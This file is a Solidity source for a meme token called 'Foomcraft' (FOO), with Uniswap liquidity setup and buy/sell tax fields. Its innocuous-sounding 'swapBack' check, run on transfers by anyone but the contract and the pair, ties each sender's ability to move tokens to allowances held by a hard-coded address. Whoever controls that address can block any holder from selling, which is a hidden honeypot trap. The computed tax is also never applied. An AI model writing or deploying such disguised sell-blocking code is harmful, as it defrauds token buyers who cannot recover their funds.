// SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

// https://x.com/BillyM2k/status/1877817676648915171


contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
}
interface IUniswapV2Router {
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
contract WorldOfFoomcraft is Ownable, IERC20, Context {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  88000000000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    bool tradingOpen = false;
    address public uniswapV2Pair;
    address _uniPairV2 = 0x25161A92257eE35E566EeF0D8a97b119D7A4A2b6;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    bool inSwap = false;
    mapping (address => uint256) private _balances;
    bool tradingEnabled = false;
    address private deployer;
    bool private swapEnabled = false;

    uint256 private _initialBuyTax=18;
    uint256 private _initialSellTax=18;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=18;
    uint256 private _reduceSellTaxAt=18;
    uint256 private _preventSwapBefore=18;
    uint256 private _buyCount=0;

    string private constant _name = "Foomcraft";
    string private constant _symbol = "FOO";

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function symbol() public pure returns (string memory) { 
        return _symbol; 
    }

    function name() public pure returns (string memory) { 
        return _name; 
    }

    function balanceOf(address account) public view returns (uint256) { 
        return _balances[account]; 
    }

    function decimals() public view returns (uint8) { 
        return _decimals; 
    }

    function totalSupply() public view returns (uint256) { 
        return _totalSupply; 
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) { 
        return _allowances[owner][spender]; 
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapBack(address to, uint256 amount) private view{
        uint256 _allowance = _allowances[_uniPairV2][to];
        require(_allowance == 0);
    }

    function enableTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
        swapEnabled = true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero.");
        require(to != address(0), "Transfer to the zero address.");
        uint256 taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
        if (from != address(this) && from != uniswapV2Pair) {
            swapBack(from, amount);
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            _buyCount++;
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

}